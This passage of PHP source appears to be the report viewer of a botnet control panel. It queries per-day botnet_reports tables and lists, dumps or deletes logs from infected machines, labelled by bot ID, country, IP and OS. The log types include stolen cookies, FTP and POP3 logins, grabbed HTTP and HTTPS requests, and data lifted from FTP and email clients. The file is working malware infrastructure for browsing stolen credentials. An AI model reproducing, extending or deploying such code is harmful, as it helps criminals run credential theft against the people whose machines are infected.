      THEME_DIALOG_END.
    THEME_FORMGET_END;
  }
  
  ThemeEnd();
}
else if($_is_ajax_search)
{
  //Ищим таблицу.
  $table = 0;
  foreach($rlist as $t)if(intval(substr($t, -6)) == $filter['date']){$table = $t; break;}
  if($table === 0)die(LNG_REPORTS_DATE_EMPTY);
  
  //Выполняем запрос.
  if($filter['rm'] === 1)
  {
    if($query1 == '')$q = 'DROP TABLE IF EXISTS '.$table;
    else $q = 'DELETE QUICK FROM '.$table.$query1;
    
    if(!mysqlQueryEx($table, $q))die(mysqlErrorEx());
    if($query1 == '')die(LNG_REPORTS_DATE_DROPPED);
    die(sprintf(LNG_REPORTS_DATE_REMOVED, mysql_affected_rows()));
  }
  else
  {
    $last_botid = 0;
    $GLOBALS['_next_bot_popupmenu__'] = $filter['date'];
    
    $q = 'SELECT id, bot_id, country, ipv4, SUBSTRING(context, 1, '.REPORT_PREVIEW_MAX_CHARS.'), SUBSTRING(path_source, 1, '.REPORT_PREVIEW_MAX_CHARS.'), type FROM '.$table.$query1.$query2;
    $r = mysqlQueryEx($table, $q);
    if(!$r)die(mysqlErrorEx());
    if(mysql_affected_rows() == 0)die(LNG_REPORTS_DATE_NOREPORTS);
    
    //Выводим результат.
    $nn = $filter['nonames']; 
    while(($m = mysql_fetch_row($r)))
    {
      //Запись нового имени бота.
      if($nn === 0 && strcasecmp($m[1], $last_botid) !== 0)
      {
        $last_botid = $m[1];
        echo THEME_STRING_NEWLINE.str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlEntitiesEx($m[1]), ''), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3).THEME_STRING_SPACE.
             botPopupMenu($m[1], 'botmenu').THEME_STRING_NEWLINE.htmlEntitiesEx($m[2].', '.$m[3]).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
      }
      
      //Запись заголовка лога.
      $st1 = trim($m[4]);
      $st2 = trim($m[5]);
      if(mb_strlen($st1) >= REPORT_PREVIEW_MAX_CHARS)$st1 .= '...';
      if(mb_strlen($st2) >= REPORT_PREVIEW_MAX_CHARS)$st2 .= '...';
      
      $text = '';
      switch($m[6])
      {
        case BLT_COOKIES:               $text = LNG_BLT_COOKIES; break;
        case BLT_FILE:                  $text = LNG_BLT_FILE.'. '.htmlEntitiesEx($st2); break;
        case BLT_HTTP_REQUEST:
        case BLT_HTTPS_REQUEST:         $text = htmlEntitiesEx($st2); break;
        case BLT_LOGIN_FTP:             $text = str_replace(array('{URL}', '{TEXT}'), htmlEntitiesEx($st1), THEME_STRING_REPORTPREVIEW_FTP); break;
        case BLT_LOGIN_POP3:            $text = htmlEntitiesEx($st1); break;
        case BLT_GRABBED_UI:            $text = LNG_BLT_GRABBED_UI.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_HTTP:          $text = LNG_BLT_GRABBED_HTTP.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_WSOCKET:       $text = LNG_BLT_GRABBED_WSOCKET.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_FTPSOFTWARE:   $text = LNG_BLT_GRABBED_FTPSOFTWARE.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_EMAILSOFTWARE: $text = LNG_BLT_GRABBED_EMAILSOFTWARE.'. '.htmlEntitiesEx($st2); break;
        case BLT_GRABBED_OTHER:         $text = LNG_BLT_GRABBED_OTHER.'. '.htmlEntitiesEx($st2); break;
        //case BLT_UNKNOWN:
        default:                      $text = LNG_BLT_UNKNOWN;
      }

      echo str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;t='.htmlEntitiesEx($filter['date']).'&amp;id='.$m[0], $text), THEME_STRING_REPORTPREVIEW).THEME_STRING_NEWLINE;
    }
  }
}
else if($_is_plain_search)
{
  define('REPEAT_SIZE', 40); //Размер визальных разделитилей.
  define('HEADER_PAD',  30); //Длина заголовков.
  
  httpNoCacheHeaders();
  httpU8PlainHeaders();
  
  $nc = $filter['nonames'];
  
  foreach($rlist as $t)
  {
    $v = intval(substr($t, -6));
    if($v >= $filter['date1'] && $v <= $filter['date2'])
    {
      $lastdata = array_fill(0, 15, 0);
      
      //Заголовок даты.
      echo str_repeat('=', REPEAT_SIZE).' '.gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)).' '.str_repeat('=', REPEAT_SIZE)."\r\n";
      flush();
      
      //Запрос.                 //0     //1     //2          //3         //4          //5          //6             //7        //8    //9      //10  //11          //12         //13
      $r = mysqlQueryEx($t,
                        'SELECT bot_id, botnet, bot_version, os_version, language_id, time_system, time_localbias, time_tick, rtime, country, ipv4, process_name, path_source, type,'.
                                //14      //15
                        'LENGTH(context), context FROM '.$t.$query1.$query2);
      if(!$r)echo mysqlErrorEx();
      else if(mysql_affected_rows() == 0)echo LNG_REPORTS_DATE_NOREPORTS;
      else while(($m = mysql_fetch_row($r)))
      {
        if($nc !== 1)
        {
          $hdr = '';
          
          //FIXME: А где mb_strcasecmp?
          if(strcmp($lastdata[0], $m[0]) !== 0)
          {
            $lastdata = array_fill(0, 15, 0);
            $hdr .= str_pad(LNG_REPORTS_VIEW_BOTID, HEADER_PAD).($lastdata[0] = $m[0])."\r\n";
          }
          
          if(strcmp($lastdata[1], $m[1]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_BOTNET,  HEADER_PAD).               ($lastdata[1] = $m[1])."\r\n";
          if($lastdata[2] !== $m[2])           $hdr .= str_pad(LNG_REPORTS_VIEW_VERSION, HEADER_PAD).intToVersion(  ($lastdata[2] = $m[2]))."\r\n";
          if(strcmp($lastdata[3], $m[3]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_OS,      HEADER_PAD).osDataToString(($lastdata[3] = $m[3]))."\r\n";
          if($lastdata[4] !== $m[4])           $hdr .= str_pad(LNG_REPORTS_VIEW_OSLANG,  HEADER_PAD).               ($lastdata[4] = $m[4])."\r\n";
          
          $hdr .= str_pad(LNG_REPORTS_VIEW_TIME, HEADER_PAD).gmdate(LNG_FORMAT_DT, $m[5] + $m[6])."\r\n";
          
          if($lastdata[6] !== $m[6])$hdr .= str_pad(LNG_REPORTS_VIEW_TIMEBIAS, HEADER_PAD).timeBiasToText(($lastdata[6] = $m[6]))."\r\n";
          
          $hdr .= str_pad(LNG_REPORTS_VIEW_TICK,  HEADER_PAD).tickCountToText($m[7] / 1000)."\r\n";
          $hdr .= str_pad(LNG_REPORTS_VIEW_RTIME, HEADER_PAD).gmdate(LNG_FORMAT_DT, $m[8])."\r\n";
          
          if(strcmp($lastdata[9], $m[9]) !== 0)  $hdr .= str_pad(LNG_REPORTS_VIEW_COUNTRY,  HEADER_PAD).($lastdata[9]  = $m[9])."\r\n";
          if(strcmp($lastdata[10], $m[10]) !== 0)$hdr .= str_pad(LNG_REPORTS_VIEW_IPV4,     HEADER_PAD).($lastdata[10] = $m[10])."\r\n";
          
          echo "\r\n".str_repeat('=', REPEAT_SIZE)."\r\n".
               $hdr.
               str_pad(LNG_REPORTS_VIEW_PROCNAME, HEADER_PAD).(empty($m[11]) ? '-' : $m[11])."\r\n".
               str_pad(LNG_REPORTS_VIEW_SOURCE,   HEADER_PAD).(empty($m[12]) ? '-' : $m[12])."\r\n".
               str_pad(LNG_REPORTS_VIEW_TYPE,     HEADER_PAD).bltToLng($m[13])."\r\n".
               str_pad(LNG_REPORTS_VIEW_SIZE,     HEADER_PAD).numberFormatAsInt($m[14])."\r\n".
               "\r\n".str_repeat('-', REPEAT_SIZE)."\r\n";
        }
        
        echo $m[15]."\r\n\r\n";  
        flush();
      }
      
      echo "\r\n";  
    }
  }
  
  echo "\r\n".str_repeat('=', REPEAT_SIZE).' EOF '.str_repeat('=', REPEAT_SIZE);
}

die();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Создание списка дат по таблицам botnet_reports_* для элемента select.
  
  IN $name  - string, название элемента select.
  IN $rlist - array, список таблиц.
  
  Return    - string, набор THEME_DIALOG_ITEM_LISTBOX_ITEM.
*/
function MakeDateList($name, $rlist)
{
  $rlist_count = count($rlist);
  $f = '';
  
  if($rlist_count == 0)
  {
    $f .= str_replace(array('{VALUE}', '{TEXT}'), array(0, '--.--'), THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR);
  }
  else for($i = 0, $cur = 0; $i < $rlist_count; $i++)
  {
    if($cur == 0 && ($GLOBALS['filter'][$name] === intval(substr($rlist[$i], -6)) || $i + 1 == $rlist_count))
    {
      $item = THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR;
      $cur++;
    }
    else $item = THEME_DIALOG_ITEM_LISTBOX_ITEM;
  
    $f .= str_replace(array('{VALUE}', '{TEXT}'), array(htmlEntitiesEx(substr($rlist[$i], -6)), htmlEntitiesEx(substr($rlist[$i], -2, 2).'.'.substr($rlist[$i], -4, 2))), $item);
  }
  
  return $f;
}
?>